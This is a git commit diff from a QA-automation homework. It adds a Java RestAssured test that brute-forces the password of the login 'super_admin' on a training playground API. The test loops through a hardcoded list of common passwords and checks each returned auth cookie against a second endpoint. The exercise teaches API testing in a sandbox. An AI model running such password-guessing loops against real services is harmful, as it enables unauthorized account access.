5716871edc1c7bc72d08cc0f9e5d802dc1f91c3f
Петрик Алексей <alexey.petric@gmail.com>
2023-01-14 17:07:54 +1000

    solution Ex9

--- src/test/java/HelloWorldTest.java
+++ src/test/java/HelloWorldTest.java
@@ -4,6 +4,9 @@ import io.restassured.response.Response;
 import org.apache.http.HttpStatus;
 import org.junit.jupiter.api.Test;
 
+import java.util.HashMap;
+import java.util.Map;
+
 public class HelloWorldTest {
     @Test
     public void testHelloWorld() {
@@ -133,4 +136,76 @@ public class HelloWorldTest {
             }
         }
     }
+
+    /*
+    Сегодня к нам пришел наш коллега и сказал, что забыл свой пароль от важного сервиса. Он просит нас помочь ему написать программу, которая подберет его пароль.
+    Условие следующее. Есть метод: https://playground.learnqa.ru/ajax/api/get_secret_password_homework
+    Его необходимо вызывать POST-запросом с двумя параметрами: login и password
+    Если вызвать метод без поля login или указать несуществующий login, метод вернет 500
+    Если login указан и существует, метод вернет нам авторизационную cookie с названием auth_cookie и каким-то значением.
+    У метода существует защита от перебора. Если верно указано поле login, но передан неправильный password, то авторизационная cookie все равно вернется. НО с "неправильным" значением, которое на самом деле не позволит создавать авторизованные запросы. Только если и login, и password указаны верно, вернется cookie с "правильным" значением. Таким образом используя только метод get_secret_password_homework невозможно узнать, передали ли мы верный пароль или нет.
+    По этой причине нам потребуется второй метод, который проверяет правильность нашей авторизованной cookie: https://playground.learnqa.ru/ajax/api/check_auth_cookie
+    Если вызвать его без cookie с именем auth_cookie или с cookie, у которой выставлено "неправильное" значение, метод вернет фразу "You are NOT authorized".
+    Если значение cookie “правильное”, метод вернет: “You are authorized”
+    Коллега говорит, что точно помнит свой login - это значение super_admin
+    А вот пароль забыл, но точно помнит, что выбрал его из списка самых популярных паролей на Википедии (вот тебе и супер админ...).
+    Ссылка: https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
+    Искать его нужно среди списка Top 25 most common passwords by year according to SplashData - список паролей можно скопировать в ваш тест вручную или придумать более хитрый способ, если сможете.
+
+    Итак, наша задача - написать тест и указать в нем login нашего коллеги и все пароли из Википедии в виде списка. Программа должна делать следующее:
+    1. Брать очередной пароль и вместе с логином коллеги вызывать первый метод get_secret_password_homework. В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.
+    2. Далее эту cookie мы должна передать во второй метод check_auth_cookie. Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный. В этом случае берем следующий пароль и все заново. Если же вернулась другая фраза - нужно, чтобы программа вывела верный пароль и эту фразу.
+
+    Ответом к задаче должен быть верный пароль и ссылка на коммит со скриптом.
+     */
+    @Test
+    public void bruteforce() {
+        Map<String, String> data = new HashMap<>();
+        data.put("login", "super_admin");
+        data.put("password", "");
+        //TODO: придумать как взять пароли с сайта
+        String[] passwords = new String[]{
+                "password", "123456", "12345678", "qwerty", "abc123",
+                "monkey", "1234567", "letmein", "trustno1", "dragon",
+                "baseball", "111111", "iloveyou", "master", "sunshine",
+                "ashley", "bailey", "passw0rd", "shadow", "123123",
+                "654321", "superman", "qazwsx", "michael", "Football",
+                "123456", "abc123", "football", "1234", "sunshine",
+                "!@#$%^&*", "welcome", "12345679", "123456789", "qwerty",
+                "12345678", "111111", "1234567890", "1234567", "password",
+                "123123", "987654321", "qwertyuiop", "mynoob", "123321",
+                "666666", "18atcskd2w", "7777777", "1q2w3e4r", "654321",
+                "555555", "3rjs1la7qe", "google", "1q2w3e4r5t", "123qwe",
+                "zxcvbnm", "1q2w3e"
+
+        };
+
+        for (String password : passwords) {
+            data.put("password", password);
+            Response response = RestAssured
+                    .given()
+                    .body(data)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+            response.prettyPrint();
+            if (response.getStatusCode() == HttpStatus.SC_OK) {
+                Response responseCheck = RestAssured
+                        .given()
+                        .body(data)
+                        .cookies(response.getCookies())
+                        .when()
+                        .post(" https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                        .andReturn();
+                if (!responseCheck.asString().equals("You are NOT authorized")) {
+                    System.out.printf("Фраза - %s, Пароль - %s%n", responseCheck.asString(), password);
+                    break;
+                }
+            }
+        }
+    }
 }
+
+
+
+
